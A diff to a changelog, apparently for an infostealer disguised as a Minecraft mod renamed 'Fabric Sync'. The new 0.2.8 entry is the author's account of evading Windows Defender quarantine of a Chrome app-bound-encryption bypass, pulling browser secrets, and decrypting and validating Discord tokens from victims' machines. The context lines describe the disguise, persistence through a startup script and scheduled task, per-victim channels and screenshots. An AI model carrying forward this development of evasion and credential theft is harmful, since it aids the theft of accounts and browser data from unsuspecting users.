@@ -1,5 +1,14 @@
 # Changelog
 
+## 0.2.8
+
+- ABE resilience: Defender quarantined `chromelevator_x64.exe.tmp` before the move, so every browser failed and no `v20=` was written. Extraction now writes the final filename directly, starts it as soon as possible and retries up to three times on quarantine.
+- The no-file PowerShell app-bound unwrap now runs before ABE, so v20 survives even when Defender blocks the elevator; ABE only adds the plaintext TSV.
+- Discord: newer builds store the token as a `v10` AES-GCM envelope with a DPAPI-wrapped key in `Local State`. The agent now unwraps that key with `ProtectedData CurrentUser`, decrypts the envelope and validates `/users/@me`; the old DPAPI blob and raw fallback remain.
+- `decrypt.py` decrypts those `v10` Discord envelopes with the user masterkey, so an old harvest or a blocked agent can still recover the token with `-p`.
+- `tools/ingest-case.sh` gains `--win-password` and `--machinekey` passthrough for incomplete or legacy cases and now removes `decrypted/` with `--clean` after the encrypted archive verifies.
+
+
 ## 0.2.7
 
 - Visible rename to `Fabric Sync`: install directory `%LOCALAPPDATA%\FabricSync`, `cache\`, `runtime.jar`, `javaw.exe`, `startup.vbs`, `update.*`, `session.txt`, `config.json`, `.version`, `logs\update.log`, task `\FabricSync`, channel `sync-<host>-<user>`, embed `Fabric Sync`, `fabric-sync-<version>.jar`, `sync-<ts>.zip`, `cache\system-<ts>.zip`, `cache\elevate.bat`, `screen-<ts>.png` and `out-<ts>.txt`. The mod id stays `serverpackcore`.
